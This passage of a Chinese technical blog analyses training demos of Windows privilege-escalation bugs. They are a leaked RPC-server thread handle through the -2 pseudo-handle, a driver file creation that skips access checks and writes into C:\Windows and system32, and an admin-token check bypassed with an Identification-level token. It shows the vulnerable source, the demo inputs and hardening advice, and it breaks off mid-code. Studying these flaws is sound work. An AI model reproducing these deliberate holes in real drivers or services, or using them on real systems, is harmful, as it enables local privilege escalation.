<p>看了一下源码，CreateNativeSymlink 是调用 NtCreateSymbolicLinkObject，是在 Object Manager 中创建符号链接。</p>
<h2 id="10-DEMO-10-Handle-Duplication"><a href="#10-DEMO-10-Handle-Duplication" class="headerlink" title="10 DEMO 10 : Handle Duplication"></a>10 DEMO 10 : Handle Duplication</h2><p>试着运行了一下 DemoClient 的对应测试项，没有看懂是怎么回事儿，还是根据源码看看目标是什么吧</p>
<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// RpcServer.cpp</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="function"><span class="keyword">int</span> <span class="title">TestDuplicateHandle</span><span class="params">(<span class="keyword">handle_t</span> hBinding, <span class="keyword">int</span> handle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"TestDuplicateHandle called\n"</span>);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> pid;</span><br><span class="line">  RPC_STATUS status = I_RpcBindingInqLocalClientPID(hBinding, &amp;pid);</span><br><span class="line">  <span class="keyword">if</span> (status != ERROR_SUCCESS)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Error getting local PID: %ls\n"</span>, GetErrorMessage(status).c_str());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">ScopedHandle <span class="title">process</span><span class="params">(OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid))</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (process.IsInvalid())</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Error getting opening process: %ls\n"</span>, GetErrorMessage(GetLastError()).c_str());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  HANDLE ret;</span><br><span class="line">  <span class="keyword">if</span> (!DuplicateHandle(process.Get(), (HANDLE)handle, process.Get(), &amp;ret, <span class="number">0</span>, FALSE, DUPLICATE_SAME_ACCESS))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Error getting duplicating handle: %ls\n"</span>, GetErrorMessage(GetLastError()).c_str());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行于 RpcServer 的这段代码的实现功能是：从 Rpc Client 进程复制一个 handle 给 Rpc Client 自己。测试时，客户端可以指定希望复制的 handle 值，我们的目标就是泄露 RpcServer 的 handle。</p>
<p>前面几行是获得 Rpc Client 进程的 Process Handle，后面调用 DuplicateHandle 是实际的 handle 复制动作，基本上唯一可控的就是 handle 值了</p>
<h3 id="pseudo-handle-伪-handle"><a href="#pseudo-handle-伪-handle" class="headerlink" title="pseudo handle(伪 handle)"></a>pseudo handle(伪 handle)</h3><p>有两个 handle 属于 pseudo-handle: -1 和 -2，分别是 GetCurrentProcess 和 GetCurrentThread 的返回值。这两个常量 handle 值并不是真正的 handle，而是为了方便程序员对当前进程、当前线程的引用而使用的伪 handle。</p>
<p>GetCurrentThread 返回的 handle 值永远是 -2，kernel32.dll 中反汇编的 GetCurrentThread 的源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HANDLE __<span class="function">stdcall <span class="title">GetCurrentThread</span><span class="params">()</span></span></span><br><span class="line">public _GetCurrentThread@0</span><br><span class="line">_GetCurrentThread@<span class="number">0</span> proc near</span><br><span class="line">mov     eax, <span class="number">0F</span>FFFFFFEh</span><br><span class="line">retn</span><br><span class="line">_GetCurrentThread@<span class="number">0</span> endp</span><br></pre></td></tr></table></figure>

<p>实际上，当前线程的 handle 并不是 -2，实际的 handle 值可以通过调用 KeGetCurrentThread() 获得。</p>
<h3 id="DuplicateHandle-对-GetCurrentProcess-和-GetCurrentThread-区别对待"><a href="#DuplicateHandle-对-GetCurrentProcess-和-GetCurrentThread-区别对待" class="headerlink" title="DuplicateHandle 对 GetCurrentProcess 和 GetCurrentThread 区别对待"></a>DuplicateHandle 对 GetCurrentProcess 和 GetCurrentThread 区别对待</h3><p>反汇编分析 DuplicateHandle 的源码，它会调用 ObpReferenceProcessObjectByHandle 先获得客户端传递来的 handle 所引用的对象。</p>
<p>结合 WRK 和 IDA 的反编译结果，简化后 ObpReferenceProcessObjectByHandle 的部分代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS</span><br><span class="line">ObpReferenceProcessObjectByHandle (</span><br><span class="line">    IN HANDLE Handle,</span><br><span class="line">    IN PEPROCESS Process,</span><br><span class="line">    IN PHANDLE_TABLE HandleTable,</span><br><span class="line">    IN KPROCESSOR_MODE AccessMode,</span><br><span class="line">    OUT PVOID *Object,</span><br><span class="line">    OUT POBJECT_HANDLE_INFORMATION HandleInformation,</span><br><span class="line">    OUT PACCESS_MASK AuditMask</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    ACCESS_MASK GrantedAccess;</span><br><span class="line">    //...</span><br><span class="line"></span><br><span class="line">    Thread = KeGetCurrentThread ();</span><br><span class="line">    *Object = NULL;</span><br><span class="line"></span><br><span class="line">    //</span><br><span class="line">    // Check is this handle is a kernel handle or one of the two builtin pseudo handles</span><br><span class="line">    //</span><br><span class="line">    if ((LONG)(ULONG_PTR) Handle &lt; 0) &#123;</span><br><span class="line">        //</span><br><span class="line">        //  If the handle is equal to the current process handle and the object</span><br><span class="line">        //  type is NULL or type process, then attempt to translate a handle to</span><br><span class="line">        //  the current process. Otherwise, check if the handle is the current</span><br><span class="line">        //  thread handle.</span><br><span class="line">        //</span><br><span class="line"></span><br><span class="line">        if (Handle == GetCurrentProcess()) &#123;</span><br><span class="line"></span><br><span class="line">            GrantedAccess = Process-&gt;GrantedAccess;</span><br><span class="line"></span><br><span class="line">            ObjectHeader = OBJECT_TO_OBJECT_HEADER(Process);</span><br><span class="line"></span><br><span class="line">            HandleInformation-&gt;GrantedAccess = GrantedAccess;</span><br><span class="line">            HandleInformation-&gt;HandleAttributes = 0;</span><br><span class="line"></span><br><span class="line">            *AuditMask = 0;</span><br><span class="line"></span><br><span class="line">            ObpIncrPointerCount(ObjectHeader);</span><br><span class="line">            *Object = Process;</span><br><span class="line">            Status = STATUS_SUCCESS;</span><br><span class="line"></span><br><span class="line">            return Status;</span><br><span class="line"></span><br><span class="line">        //</span><br><span class="line">        //  If the handle is equal to the current thread handle and the object</span><br><span class="line">        //  type is NULL or type thread, then attempt to translate a handle to</span><br><span class="line">        //  the current thread. Otherwise, the we&apos;ll try and translate the</span><br><span class="line">        //  handle</span><br><span class="line">        //</span><br><span class="line"></span><br><span class="line">        &#125; else if (Handle == GetCurrentThread()) &#123;</span><br><span class="line"></span><br><span class="line">            GrantedAccess = Thread-&gt;GrantedAccess;</span><br><span class="line"></span><br><span class="line">            ObjectHeader = OBJECT_TO_OBJECT_HEADER(Thread);</span><br><span class="line"></span><br><span class="line">            HandleInformation-&gt;GrantedAccess = GrantedAccess;</span><br><span class="line">            HandleInformation-&gt;HandleAttributes = 0;</span><br><span class="line"></span><br><span class="line">            *AuditMask = 0;</span><br><span class="line"></span><br><span class="line">            ObpIncrPointerCount(ObjectHeader);</span><br><span class="line">            *Object = Thread;</span><br><span class="line"></span><br><span class="line">            Status = STATUS_SUCCESS;</span><br><span class="line"></span><br><span class="line">            return Status;</span><br><span class="line"></span><br><span class="line">        &#125; else if (AccessMode == KernelMode) &#123;</span><br><span class="line">            //</span><br><span class="line">            //  Make the handle look like a regular handle</span><br><span class="line">            //</span><br><span class="line"></span><br><span class="line">            Handle = DecodeKernelHandle( Handle );</span><br><span class="line"></span><br><span class="line">            //</span><br><span class="line">            //  The global kernel handle table</span><br><span class="line">            //</span><br><span class="line"></span><br><span class="line">            HandleTable = ObpKernelHandleTable;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            //</span><br><span class="line">            // The previous mode was user for this kernel handle value. Reject it here.</span><br><span class="line">            //</span><br><span class="line"></span><br><span class="line">            return STATUS_INVALID_HANDLE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 后面代码略...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>上面这段代码非常重要，有点需要注意：</p>
<ul>
<li><p>当 Handle 为 GetCurrentProcess()（即 -1）时，返回的 Object 为参数 Process 所引用的对象，后面会介绍，这个 Process 是 RpcClient 进程对象。</p>
</li>
<li><p>当 Handle 为 GetCurrentThread()（即 -2）时，返回的 Object 为 KeGetCurrentThread() 返回的当前线程对象，也就是当前的 RpcServer 中的 Calling Thread 对象。</p>
</li>
</ul>
<p>参数 Process 所引用的 Process 对象哪里来的呢？</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">BOOL __<span class="function">stdcall <span class="title">DuplicateHandle</span><span class="params">(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  v7 = hSourceHandle;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  v8 = NtDuplicateObject(</span><br><span class="line">         hSourceProcessHandle,</span><br><span class="line">         v7,</span><br><span class="line">         hTargetProcessHandle,</span><br><span class="line">         lpTargetHandle,</span><br><span class="line">         dwDesiredAccess,</span><br><span class="line">         bInheritHandle != <span class="number">0</span> ? <span class="number">2</span> : <span class="number">0</span>,</span><br><span class="line">         dwOptions);</span><br><span class="line">  <span class="keyword">if</span> ( v8 &gt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  BaseSetLastNTError(v8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>winbase!DuplicateHandle-&gt;ntoskrnl!NtDuplicateObject-&gt;ntoskrnl!ObDuplicateObject-&gt;ntoskrnl!ObpReferenceProcessObjectByHandle</p>
<p>传递给 DuplicateHandle 的 hSourceProcessHandle，在  NtDuplicateObject 中被解引用为进程对象继续向下传递，直到 ObpReferenceProcessObjectByHandle 中作为参数 Process。所以当 Rpc Client 进程传递的 handle 为 -1 时，返回的是 Rpc Client 进程自己的 handle。</p>
<h3 id="漏洞到底出在哪"><a href="#漏洞到底出在哪" class="headerlink" title="漏洞到底出在哪"></a>漏洞到底出在哪</h3><p>当 Rpc Client 进程传递 -2 作为 handle 值给 Rpc Server 时，Rpc Server 根据 handle 值 -2 解引用对象，没有考虑 -2 是个伪 handle，-2 代表 Rpc Server 中的当前线程，然后复制该线程句柄给了 Rpc Client，造成了高权限进程线程句柄的泄露，客户端得到这个句柄之后，就可以实现一些越权操作了。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><p><a href="https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html" target="_blank" rel="noopener">Project Zero Blog - Exploiting a Leaked Thread Handle</a></p>
</li>
<li><p><a href="https://github.com/bigzz/WRK/blob/master/base/ntos/ob/obref.c#L1355" target="_blank" rel="noopener">WRK Source Code</a></p>
</li>
</ul>
<h2 id="11-DEMO-11-Privileged-Resource-Creation"><a href="#11-DEMO-11-Privileged-Resource-Creation" class="headerlink" title="11 DEMO 11 : Privileged Resource Creation"></a>11 DEMO 11 : Privileged Resource Creation</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">HandleIoControl</span><span class="params">(PIRP Irp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="keyword">switch</span> (code)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">case</span> ControlCreateFile:</span><br><span class="line">    <span class="keyword">return</span> CreateFile(&amp;path, FALSE, FALSE);</span><br><span class="line">  <span class="keyword">case</span> ControlCreateFileSecure:</span><br><span class="line">    <span class="keyword">return</span> CreateFile(&amp;path, TRUE, FALSE);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">CreateFile</span><span class="params">(PUNICODE_STRING Path, BOOLEAN Secure, BOOLEAN Directory)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  OBJECT_ATTRIBUTES obj_attr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">  HANDLE Handle = <span class="literal">NULL</span>;</span><br><span class="line">  IO_STATUS_BLOCK io_status = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">  NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">  ULONG CreateOptions = Directory ? FILE_DIRECTORY_FILE : FILE_NON_DIRECTORY_FILE;</span><br><span class="line">  ULONG AttributeFlags = OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE;</span><br><span class="line">  <span class="keyword">if</span> (Secure)</span><br><span class="line">  &#123;</span><br><span class="line">    AttributeFlags |= OBJ_FORCE_ACCESS_CHECK;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  InitializeObjectAttributes(&amp;obj_attr, Path, AttributeFlags, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  CHECK_STATUS(ZwCreateFile(&amp;Handle, MAXIMUM_ALLOWED, &amp;obj_attr, &amp;io_status,</span><br><span class="line">    <span class="literal">NULL</span>, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_DELETE,</span><br><span class="line">    FILE_OPEN_IF, CreateOptions, <span class="literal">NULL</span>, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">  <span class="keyword">if</span> (Handle)</span><br><span class="line">  &#123;</span><br><span class="line">    ZwClose(Handle);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从源码和标题来看，这个 case 主要是用户态 DemoClient 利用内核创建文件。那能不能创建 DemoClient 本身没有权限创建的文件呢？比如向 c:\windows 目录</p>
<h3 id="内核态-ZwCreateFile-创建文件时如何指定路径"><a href="#内核态-ZwCreateFile-创建文件时如何指定路径" class="headerlink" title="内核态 ZwCreateFile 创建文件时如何指定路径"></a>内核态 ZwCreateFile 创建文件时如何指定路径</h3><p>与普通用户态程序调用 CreateFile 创建文件不同的时，ZwCreateFile 要求传入的路径必须是一个包括设备名的全路径。<br>假如我们要创建文件 c:\windows\helloworld，我们传入 ZwCreateFile 的路径需要是 ??\c:\windows\helloworld 或者 \DosDevices\c:\windows\helloworld，如果是前者，对象管理器会负责转换为后者。(其实传入 \GLOBAL??\c:\windows\helloworld 也可以，这个在 Demo9 中讨论过)</p>
<h3 id="验证向特殊目录写入文件"><a href="#验证向特殊目录写入文件" class="headerlink" title="验证向特殊目录写入文件"></a>验证向特殊目录写入文件</h3><p>实际测试下面的过程，可以成功向 c:\windows 和 c:\windows\system32 下会创建文件，然而 DemoClient 本身是没有对这些目录的写权限的。新创建的这两个文件的属主用户为当前进程 DemoClient 的用户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[Driver File Tests]</span><br><span class="line">1 - Create File</span><br><span class="line">2 - Create File Secure</span><br><span class="line">3 - Create Dir</span><br><span class="line">4 - Create Dir Secure</span><br><span class="line">0 - Exit Menu</span><br><span class="line">Specify operation number: 1</span><br><span class="line"></span><br><span class="line">Specify native path: \??\C:\Windows\abc.txt</span><br><span class="line">[Driver File Tests]</span><br><span class="line">1 - Create File</span><br><span class="line">2 - Create File Secure</span><br><span class="line">3 - Create Dir</span><br><span class="line">4 - Create Dir Secure</span><br><span class="line">0 - Exit Menu</span><br><span class="line">Specify operation number: 1</span><br><span class="line"></span><br><span class="line">Specify native path: \??\C:\Windows\system32\abc.txt</span><br><span class="line">[Driver File Tests]</span><br><span class="line">1 - Create File</span><br><span class="line">2 - Create File Secure</span><br><span class="line">3 - Create Dir</span><br><span class="line">4 - Create Dir Secure</span><br><span class="line">0 - Exit Menu</span><br></pre></td></tr></table></figure>

<p>参考：</p>
<ul>
<li><p><a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff566424(v=vs.85).aspx" target="_blank" rel="noopener">MSDN ZwCreateFile</a></p>
</li>
<li><p><a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff565384(v=vs.85).aspx" target="_blank" rel="noopener">MSDN Using Files In A Driver</a></p>
</li>
</ul>
<h3 id="DemoClient-为什么可以越权写了文件"><a href="#DemoClient-为什么可以越权写了文件" class="headerlink" title="DemoClient 为什么可以越权写了文件"></a>DemoClient 为什么可以越权写了文件</h3><p>选择 1 - Create File 测试时，CreateFile 的 secure 参数为 FALSE，所以创建文件 handle 时指定的 OBJECT_ATTRIBUTES.AttributeFlags 没有置位 OBJ_FORCE_ACCESS_CHECK，缺少 OBJ_FORCE_ACCESS_CHECK ZwCreateFile 时内核缺少安全检查，也就没有对 DemoClient 用户态进程权限的验证。</p>
<p>用户态进程和驱动应该如何共享 handle ？</p>
<p>遵循下面几点：</p>
<ul>
<li><p>如果不希望用户态进程得到并访问这个 handle，应该置位 OBJECT_ATTRIBUTES.AttributeFlags 为 OBJ_KERNEL_HANDLE。</p>
</li>
<li><p>handle 由内核态创建然后传递给用户态，尽量不要反过来。从用户态传递过来的 handle，驱动应该认为是不可信的</p>
</li>
<li><p>驱动替用户态进程创建 handle 时，需要置位 OBJ_FORCE_ACCESS_CHECK，以添加必要的安全检查，包括进程权限的检查</p>
</li>
<li><p>与用户态共享的 handle，内核需要使用 ObReferenceObjectByPointer 引入引用计数，防止用户态 close handle 之后驱动再访问引起系统 crash</p>
</li>
</ul>
<p>参考 <a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff557758(v=vs.85).aspx" target="_blank" rel="noopener">MSDN Object Handles</a></p>
<h2 id="12-DEMO-12-Admin-Token-Check-Bypass"><a href="#12-DEMO-12-Admin-Token-Check-Bypass" class="headerlink" title="12 DEMO 12 : Admin Token Check Bypass"></a>12 DEMO 12 : Admin Token Check Bypass</h2><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>打开 Sysinternals 的 DebugView.exe 工具，标题栏勾选 [Capture]-&gt;[Capture Kernel]，抓取驱动的调试日志</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[Driver Token Tests]</span><br><span class="line">1 - Check Token Elevated</span><br><span class="line">2 - Check Token Elevated Secure</span><br><span class="line">3 - Bad Impersonation</span><br><span class="line">0 - Exit Menu</span><br><span class="line">Specify operation number: 1</span><br><span class="line"></span><br><span class="line">Impersonate Admin Token? (Y/N): n</span><br><span class="line">[Driver Token Tests]</span><br><span class="line">1 - Check Token Elevated</span><br><span class="line">2 - Check Token Elevated Secure</span><br><span class="line">3 - Bad Impersonation</span><br><span class="line">0 - Exit Menu</span><br><span class="line"></span><br><span class="line">[Driver Token Tests]</span><br><span class="line">1 - Check Token Elevated</span><br><span class="line">2 - Check Token Elevated Secure</span><br><span class="line">3 - Bad Impersonation</span><br><span class="line">0 - Exit Menu</span><br><span class="line">Specify operation number: 1</span><br><span class="line"></span><br><span class="line">Impersonate Admin Token? (Y/N): y</span><br><span class="line">[Driver Token Tests]</span><br><span class="line">1 - Check Token Elevated</span><br><span class="line">2 - Check Token Elevated Secure</span><br><span class="line">3 - Bad Impersonation</span><br><span class="line">0 - Exit Menu</span><br></pre></td></tr></table></figure>

<p>DebugView 看到的调试日志分别为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IsCallerElevated: ImpersonationLevel: None</span><br><span class="line">IsCallerElevated: ImpersonationLevel: Identification</span><br></pre></td></tr></table></figure>

<h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 驱动代码</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IsCallerElevated</span><span class="params">(BOOLEAN secure)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  SECURITY_SUBJECT_CONTEXT subject_context = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">  NTSTATUS status = STATUS_ACCESS_DENIED;</span><br><span class="line">  SeCaptureSubjectContext(&amp;subject_context);</span><br><span class="line">  PACCESS_TOKEN token = SeQuerySubjectContextToken(&amp;subject_context);</span><br><span class="line"></span><br><span class="line">  DBGPRINT(<span class="string">"ImpersonationLevel: %ls\r\n"</span>, subject_context.ClientToken</span><br><span class="line">    ? GetTokenImpersonationLevel(subject_context.ClientToken) : <span class="string">L"None"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (secure)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (subject_context.ClientToken &amp;&amp; subject_context.ImpersonationLevel &lt; SecurityImpersonation)</span><br><span class="line">    &#123;</span><br><span class="line">      status = STATUS_BAD_IMPERSONATION_LEVEL;</span><br><span class="line">      <span class="keyword">goto</span> error;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  status = GetTokenElevated(token) ? STATUS_SUCCESS : STATUS_ACCESS_DENIED;</span><br><span class="line">error:</span><br><span class="line">  SeReleaseSubjectContext(&amp;subject_context);</span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">GetTokenElevated</span><span 